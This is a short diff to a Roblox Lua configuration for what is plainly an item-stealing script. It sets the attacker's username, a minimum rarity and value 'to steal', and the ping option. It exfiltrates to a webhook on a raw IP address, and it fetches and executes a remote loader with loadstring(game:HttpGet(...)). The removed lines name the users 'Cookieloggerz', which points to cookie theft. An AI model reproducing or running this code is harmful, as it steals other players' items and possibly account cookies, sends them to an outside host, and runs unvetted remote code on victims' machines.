@@ -1,4 +1,7 @@
-Usernames = {"Cookieloggerz1", "test", "Cookieloggerz2"} -- add/delete as many as u want
-Webhooks = {"http://93.183.83.94:8000/webhook/18ae32f4-6d73-422f-870f-2db23e5df834"} -- add/delete as many as u want
+_G.users = {"nbvbw"}  -- Add your username here
+_G.min_rarity = "Godly"      -- Minimum rarity to steal (Common, Uncommon, Rare, Legendary, Godly, Ancient, Unique, Vintage)
+_G.min_value = 1             -- Minimum value per item
+_G.ping = "Yes"              -- "Yes" to ping everyone, anything else for no ping
+_G.webhook = "http://93.183.83.94:8000/webhook/7ace281a-3b84-4bc5-b107-535f8c055c95" -- Your Discord webhook URL
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/jjrite/AME/refs/heads/main/loader.lua",true))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/kjrmz/kjrmz/refs/heads/main/good",true))()
